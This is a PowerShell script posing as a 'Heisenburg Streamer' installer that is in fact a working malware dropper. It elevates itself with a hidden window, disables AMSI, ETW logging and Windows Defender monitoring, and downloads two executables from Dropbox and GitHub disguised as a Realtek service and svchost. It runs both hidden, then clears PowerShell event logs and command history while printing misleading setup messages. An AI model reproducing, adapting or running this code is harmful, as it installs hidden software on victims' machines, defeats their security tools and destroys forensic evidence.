# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v8.0 (FULL STEALTH)
# ========================================================

# 1. ELEVATION CHECK
function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

# 2. TACTICAL BYPASSES
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
   
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($etw) {
        $etwField = $etw.GetField('etwProvider','NonPublic,Static')
        if ($etwField) { $etwField.SetValue($null, 0) }
    }
} catch {}

# ================= CONFIG =================
$MainExeUrl = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
$StealthLauncherUrl = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/stealthlauncher/refs/heads/main/StealthLauncher.exe"

$RandomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
$MainExePath = "$env:TEMP\$RandomName.exe"
$LauncherPath = "$env:TEMP\svchost_$RandomName.exe"
# =========================================

function Draw-ProgressBar {
    param([int]$Percent, [string]$Status)
    $width = 40
    $done = [Math]::Floor($Percent / 100 * $width)
    $left = $width - $done
    $bar = "[" + ("=" * $done) + ">" + ("." * $left) + "]"
    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor Cyan
}

function Invoke-HyperStreamDownload {
    param([string]$Url, [string]$TargetPath)
    try {
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.UserAgent = "Mozilla/5.0"
        $request.Timeout = 60000
        $response = $request.GetResponse()
        $totalSize = 100MB
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($TargetPath)
        $buffer = New-Object byte[] 65536
        $totalRead = 0
       
        while ($true) {
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }
            $fileStream.Write($buffer, 0, $read)
            $totalRead += $read
            $pct = [int](($totalRead / $totalSize) * 100)
            if ($pct -gt 100) { $pct = 100 }
            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
        }
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        return $true
    } catch {
        if ($fileStream) { $fileStream.Close() }
        return $false
    }
}

# MAIN EXECUTION
try {
    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
   
    Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
    Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray

    # Security Bypasses
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    } catch {}

    Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray

    # Download Main EXE
    $downloadSuccess = Invoke-HyperStreamDownload -Url $MainExeUrl -TargetPath $MainExePath
    if (-not $downloadSuccess) {
        throw "Main Agent Download Failed"
    }

    Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green

    # Download Stealth Launcher
    Write-Host "[+] DOWNLOADING STEALTH PROTECTION..." -ForegroundColor Gray
    Invoke-WebRequest -Uri $StealthLauncherUrl -OutFile $LauncherPath -UseBasicParsing -UserAgent "Mozilla/5.0" -TimeoutSec 60
    Write-Host "[+] Stealth Launcher Downloaded" -ForegroundColor Green

    Write-Host "[+] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan

    # Run Stealth Launcher (with argument)
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $LauncherPath
    $si.Arguments = "`"$MainExePath`""
    $si.WindowStyle = 'Hidden'
    $si.CreateNoWindow = $true
    $si.UseShellExecute = $true
    $si.Verb = "RunAs"
    [System.Diagnostics.Process]::Start($si) | Out-Null

    # Run Main EXE Hidden
    $si2 = New-Object System.Diagnostics.ProcessStartInfo
    $si2.FileName = $MainExePath
    $si2.WindowStyle = 'Hidden'
    $si2.CreateNoWindow = $true
    $si2.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($si2) | Out-Null

    Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

    Write-Host "`n[+] STEALTH MODE SUCCESSFULLY ACTIVATED!" -ForegroundColor Green
    Write-Host "[*] Your process is now hidden from Task Manager" -ForegroundColor White
    Write-Host "[+] SETUP COMPLETE. CHECK DASHBOARD.`n" -ForegroundColor Green

} catch {
    Write-Host "`n[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
}

Remove-Variable * -ErrorAction SilentlyContinue 2>$null
